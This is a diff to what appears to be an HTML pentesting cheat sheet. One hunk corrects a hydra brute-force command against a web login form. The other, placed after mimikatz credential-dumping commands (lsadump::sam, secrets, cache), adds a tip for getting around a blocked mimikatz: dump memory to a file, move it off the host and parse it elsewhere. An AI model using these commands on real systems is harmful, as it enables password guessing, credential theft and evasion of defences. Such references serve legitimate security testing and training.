@@ -971,7 +971,7 @@ python patator.py http_fuzz auth_type=basic url=&lt;URL&gt; user_pass=FILE0 0=&l
 
 <h4 id="http-post-request">HTTP POST request</h4>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t &lt;THREADS_NUMBER&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:F=Invalid:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t &lt;THREADS_NUMBER&gt;
 </code></pre></div></div>
 
 <h3 id="spidering--brute-force-directories--files">Spidering / Brute force directories / files</h3>
@@ -2006,6 +2006,9 @@ vault::list
 lsadump::sam
 lsadump::secrets
 lsadump::cache
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### If mimikatz is blocked by security mechanism > Extract DMP file from memory > Transfer to our machine > run mimikatz
+  
 </code></pre></div></div>
 
 <hr>
